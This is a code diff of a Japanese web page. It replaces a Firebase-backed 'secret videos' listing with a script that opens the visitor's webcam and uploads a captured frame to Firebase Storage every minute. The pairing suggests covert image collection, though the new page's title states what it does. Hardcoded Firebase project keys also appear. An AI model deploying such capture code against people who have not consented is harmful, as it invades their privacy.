@@ -2,92 +2,66 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
-    <title>ひみつの動画</title>
-    <style>
-        body {
-            background-color: #C5EBE5; /* 背景色の指定 */
-            color: #AE0019; /* テキストの色を指定 */
-            font-family: Arial, sans-serif; /* フォントファミリーの指定 */
-            margin: 0; /* マージンを0に設定 */
-            height: 100vh; /* ビューポートの高さを100%に設定 */
-        }
-        h1 {
-            color: #AE0019; /* タイトルの文字色を指定 */
-            text-align: center; /* タイトルを中央揃え */
-            margin-top: 20px; /* 上部マージンを設定 */
-        }
-        /* ul { */
-        /*   list-style-type: none; /* リストのスタイルタイプを無しに設定 */ */
-        /*   padding: 0; /* パディングを0に設定 */ */
-        /*   text-align: center; /* リストを中央揃え */ */
-        /* } */
-        li {
-            margin-bottom: 15px; /* 行間を開ける */
-        }
-        li::before {
-            content: "\1F4F9"; /* ビデオカメラアイコン */
-            margin-right: 10px; /* アイコンとテキストの間にスペースを設定 */
-        }
-        li a {
-            color: #AE0019; /* リンクの文字色を指定 */
-            text-decoration: none; /* テキストデコレーションを無しに設定 */
-            display: block; /* リンクをブロック要素に設定 */
-            padding: 10px; /* パディングを設定 */
-        }
-        li a:hover {
-            background-color: rgba(255, 255, 255, 0.2); /* ホバー時の背景色を設定 */
-        }
-    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>カメラ撮影とFirebaseアップロード</title>
 </head>
 <body>
-    <h1>花御's collection</h1>
-    <ul id="mediaList"></ul>
+    <h1>カメラ撮影とFirebaseアップロード</h1>
+    <video id="video" width="320" height="240" autoplay></video>
+    <canvas id="canvas" style="display: none;"></canvas>
 
-    <!-- Firebase SDKの追加 (モジュールとして) -->
     <script type="module">
-        import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js';
-        import { getStorage, ref, listAll, getDownloadURL } from 'https://www.gstatic.com/firebasejs/10.12.0/firebase-storage.js';
+        // Firebase設定
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js";
+        import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-storage.js";
 
-        // Firebase設定の初期化
         const firebaseConfig = {
-            apiKey: "AIzaSyBf1jDkivK4IjWhK613ysNhlhfJrVa5Z4s",
-            authDomain: "hozon-4794d.firebaseapp.com",
-            projectId: "hozon-4794d",
-            storageBucket: "hozon-4794d.appspot.com",
-            messagingSenderId: "363639067783",
-            appId: "1:363639067783:web:89c021b8c297cf60e2d422",
-            measurementId: "G-NKKQJM5VQY"
+	  apiKey: "AIzaSyDsK4imQ3uWcK7hyESo6hnDyQ96lsPNCZ8",
+	  authDomain: "nou-no-circle.firebaseapp.com",
+	  projectId: "nou-no-circle",
+	  storageBucket: "nou-no-circle.appspot.com",
+	  messagingSenderId: "756338805186",
+	  appId: "1:756338805186:web:cb740e035ac611b5baae5b",
+	  measurementId: "G-TWBV38P13D"
         };
+
+        // Firebase初期化
         const app = initializeApp(firebaseConfig);
         const storage = getStorage(app);
 
-        // メディアリストを取得して表示
-        async function loadMediaList() {
-            const mediaList = document.getElementById('mediaList');
-            const storageRef = ref(storage); 
+        // カメラアクセス
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
 
-            try {
-                const result = await listAll(storageRef);
-                const sortedItems = result.items.sort((a, b) => a.name.localeCompare(b.name)); // 名前でソート
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+            })
+            .catch(err => {
+                console.error('カメラアクセスエラー:', err);
+            });
 
-                const links = await Promise.all(sortedItems.map(async (itemRef) => {
-                    const url = await getDownloadURL(itemRef);
-                    const li = document.createElement('li');
-                    const link = document.createElement('a');
-                    link.href = `play.html?mediaUrl=${encodeURIComponent(url)}`;
-                    link.textContent = itemRef.name;
-                    link.target = '_blank';
-                    li.appendChild(link);
-                    return li;
-                }));
-
-                links.forEach(li => mediaList.appendChild(li));
-            } catch (error) {
-                console.log('Error loading media list:', error);
-            }
+        // 画像をFirebase Storageにアップロード
+        function uploadImage(dataURL) {
+            const storageRef = ref(storage, `images/${Date.now()}.jpg`);
+            uploadString(storageRef, dataURL, 'data_url')
+                .then(snapshot => {
+                    console.log('画像がアップロードされました。');
+                })
+                .catch(err => {
+                    console.error('アップロードエラー:', err);
+                });
         }
 
-        window.onload = loadMediaList;
+        // 1分ごとに撮影してアップロード
+        setInterval(() => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const dataURL = canvas.toDataURL('image/jpeg');
+            uploadImage(dataURL);
+        }, 60000); // 60000ミリ秒 = 1分
     </script>
 </body>
 </html>
